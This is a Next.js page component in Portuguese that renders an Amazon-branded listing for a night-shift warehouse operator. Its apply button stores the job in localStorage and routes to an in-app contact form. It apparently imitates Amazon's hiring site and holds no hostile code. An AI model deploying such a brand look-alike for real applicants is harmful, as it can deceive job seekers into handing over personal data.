"use client";

import Image from "next/image";
import { useRouter } from "next/navigation";
import "./WarehouseJobDetails.css";

export default function WarehouseJobDetails() {
  const router = useRouter();

  const handleApply = () => {
    const vaga = {
      id: "WH12345",
      titulo: "Operador de Estoque – Turno Noturno",
      local: "Centro de Distribuição – Turno Noturno",
    salario: "R$ 4.100,00/mês", // 👈 salário incluído
    };

    // salva no localStorage
    localStorage.setItem("vagaSelecionada", JSON.stringify(vaga));

    // redireciona para candidatura
    router.push("/ApplicationContact");
  };

  return (
    <main className="vaga-detalhe">
      {/* NAVBAR */}
      <header>
        <div className="navbar">
          <div className="navbar-left">
            <Image
              src="/logo_dark.99265b07.svg"
              alt="Amazon Jobs"
              width={120}
              height={36}
              priority
            />
          </div>
          <nav className="navbar-center">
            <a href="#como-funciona">Oportunidades de Emprego</a>
            <a href="#faq">Pesquisar todas as vagas</a>
            <a href="#">Começando</a>
            <a href="#">Minha conta</a>
          </nav>
        </div>
      </header>

      {/* HERO */}
      <section className="hero-vaga">
        <h1>Operador de Estoque – Turno Noturno</h1>
        <p>
          Junte-se ao time do centro de distribuição da Amazon! 
          Essa posição envolve organização de estoque, separação de pedidos e 
          suporte às operações logísticas. O trabalho é presencial em nosso{" "}
          <strong>centro de distribuição noturno</strong>.
        </p>
      </section>

      {/* SOBRE A FUNÇÃO */}
      <section className="sobre">
        <h2>Sobre a Função</h2>
        <p>
          Como Operador de Estoque, você será responsável por movimentar,
          organizar e separar produtos para envio. A função é essencial para
          garantir que os pedidos sejam entregues de forma rápida e precisa.
        </p>
      </section>

      {/* HORÁRIOS */}
      <section className="horarios">
        <h2>Horários de Trabalho</h2>
        <p>
          Esta vaga é para o turno noturno e exige disponibilidade em escalas
          variadas.
        </p>
        <ul>
          <li>Turno principal: 22h às 06h</li>
          <li>Escalas de 36 a 44 horas semanais</li>
          <li>Inclui finais de semana e feriados alternados</li>
          <li>Compensação de horas conforme CLT</li>
        </ul>
      </section>

      {/* BENEFÍCIOS */}
      <section className="beneficios">
        <h2>Quais benefícios você receberá?</h2>
        <ul>
          <li>Plano de saúde e odontológico (CarePlus)</li>
          <li>Vale refeição e/ou alimentação</li>
          <li>Vale transporte</li>
          <li>Seguro de vida</li>
          <li>Adicional noturno</li>
          <li>Programa de assistência ao funcionário (EAP)</li>
          <li>Treinamento remunerado</li>
        </ul>
      </section>

      {/* EQUIPAMENTOS */}
      <section className="equipamentos">
        <h2>Equipamentos fornecidos</h2>
        <p>
          No centro de distribuição, você terá acesso a todos os equipamentos
          necessários para desempenhar suas funções com segurança e eficiência:
        </p>
        <ul>
          <li>Uniforme completo</li>
          <li>Equipamentos de proteção individual (EPI)</li>
          <li>Crachá de acesso</li>
          <li>Ferramentas e scanners</li>
        </ul>
        <p className="aviso">
          O uso dos EPIs é obrigatório em todas as dependências do centro de
          distribuição.
        </p>
      </section>

      {/* CTA FINAL */}
      <section className="cta-final">
        <h2>Pronto para se candidatar?</h2>
        <button onClick={handleApply} className="btn-candidatar">
          Candidate-se agora →
        </button>
      </section>

      {/* FOOTER */}
      <footer className="footer">
        <div className="footer-social">
          <h4>Junte-se a nós agora</h4>
          <a href="#" aria-label="Facebook" className="social-link">
            <svg
              width="22"
              height="22"
              viewBox="0 0 448 512"
              fill="currentColor"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path d="M400 32H48A48 48 0 0 0 0 80v352a48 48 0 0 0 48 48h137.25V327.69h-63V256h63v-54.64c0-62.15 
              37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.27c-30.81 0-40.42 19.12-40.42 
              38.73V256h68.78l-11 71.69h-57.78V480H400a48 48 0 0 0 48-48V80a48 48 0 0 0-48-48z"/>
            </svg>
          </a>
        </div>

        <div className="footer-top">
          <div className="footer-col">
            <h4>OPORTUNIDADES DE EMPREGO</h4>
            <ul>
              <li>
                <a href="#">Oportunidades em Centros de Distribuição</a>
              </li>
              <li>
                <a href="#">Empregos de atendimento ao cliente</a>
              </li>
              <li>
                <a href="#">Procura de emprego</a>
              </li>
            </ul>
          </div>

          <div className="footer-col">
            <h4>RECURSOS</h4>
            <ul>
              <li><a href="#">Perguntas Frequentes</a></li>
              <li><a href="#">Fale Conosco</a></li>
            </ul>
          </div>

          <div className="footer-logo">
            <Image
              src="/logo.92a0feec.svg"
              alt="Amazon Jobs"
              width={140}
              height={40}
            />
          </div>
        </div>

        <div className="footer-bottom">
          <p className="descricao">
            A Amazon está comprometida com um ambiente de trabalho diversificado
            e inclusivo. A Amazon é uma empregadora que oferece oportunidades
            iguais e não discrimina com base em raça, nacionalidade, sexo,
            identidade de gênero, orientação sexual, deficiência, idade ou outro
            status legalmente protegido.
          </p>

          <div className="footer-legal">
            <a href="#">Aviso de privacidade</a>
            <span>© 1996–2025 Amazon.com, Inc. ou suas afiliadas</span>
          </div>
        </div>
      </footer>
    </main>
  );
}
